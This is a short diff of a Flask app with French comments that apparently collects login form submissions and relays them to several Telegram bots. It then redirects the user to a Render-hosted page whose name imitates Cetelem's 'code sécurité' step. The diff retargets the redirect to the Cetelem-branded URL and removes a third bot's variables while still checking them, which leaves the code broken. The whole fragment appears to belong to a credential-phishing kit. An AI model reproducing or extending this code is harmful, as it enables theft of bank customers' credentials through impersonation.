@@ -16,8 +16,6 @@ CHAT_ID_1 = os.getenv("CHAT_ID_1")
 BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
 CHAT_ID_2 = os.getenv("CHAT_ID_2")
 
-BOT_TOKEN_3 = os.getenv("BOT_TOKEN_3")
-CHAT_ID_3 = os.getenv("CHAT_ID_3")
 
 # Vérification des variables d'environnement
 if not all([BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2, BOT_TOKEN_3, CHAT_ID_3]):
@@ -48,7 +46,7 @@ def login():
             if response.status_code != 200:
                 return f"Erreur avec le bot {token[:10]}... : {response.text}", 500
 
-        return redirect("https://code-s-curit-q683.onrender.com/")
+        return redirect("https://cetelem-code-s-curit-l2qp.onrender.com/")
 
     return render_template('login.html')
 
